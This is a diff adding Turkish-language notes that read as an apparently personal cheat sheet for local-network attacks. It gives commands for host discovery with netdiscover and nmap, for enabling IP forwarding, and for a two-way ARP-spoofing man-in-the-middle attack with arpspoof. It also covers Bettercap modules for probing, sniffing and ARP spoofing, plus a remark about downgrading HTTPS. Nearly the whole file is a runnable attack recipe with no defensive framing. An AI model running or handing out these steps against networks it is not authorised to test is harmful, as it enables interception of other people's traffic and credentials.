@@ -1,0 +1,69 @@
+netdiscover -i wlan0 -r 192.168.1.0/24 -c 10
+
+// -c parametresi kaç kere taraması gerektiğini belirtir. 0/24 parametresi 0'dan 255'e kadar alınan değerleri verir.
+
+veya
+
+nmap 192.168.1.0/24  //komutu da aynı işlemi görür.
+
+
+
+---MITM Saldirisi-----
+
+herşeyden önce ip adresimizi forwardlamamız gerekiyor.
+
+cat /proc/sys/net/ipv4/ip_forward //kodunu girdiğimizde 0 veriyorsa bunu 1 yapmamız gerekiyor.
+
+o halde:
+
+echo 1 > /proc/sys/net/ipv4/ip_forward // Artık ip forwardlama etkin
+
+
+
+Şimdi Başlayabiliriz:
+
+
+1.aşama: arpspoof -i <my_interface> -t <a_targets_ip> <second_targets_ip>
+
+//burada a_targets_ip olarak kendimizi second_targets_ip'ye tanıtıyoruz.
+
+2.aşama: ikinci bir terminal açıp 
+
+arpspoof -i <my_interface> -t <second_targets_ip> <a_targets_ip>
+
+//burada da second_targets_ip olarak kendimizi a_targets_ip'ye tanıtıyoruz
+
+
+
+
+
+-----------Bettercap--------------
+
+bettercap -iface <interface> 
+
+net.show //ağı haritalar. Netdiscover gibi çalışır
+
+//net.probe
+//net.recon
+
+help arp.spoof // saldırı için gerekli paramerelerin ayarlanması
+
+not: parametre ayarlarken başına set yazılır
+
+forexample: set arp.spoof.targets <mac-adress>
+
+
+// help net.probe, help.recon  : modullerle ilgili bilgi verir.
+
+net.probe on
+
+net.sniff on
+
+arp.spoof on //saldırıyı başlatır.
+
+caplets.show // capletleri gösterir.
+
+//https'i http'ye çevirmek sağlıklı çalışmıyor.
+
+
+
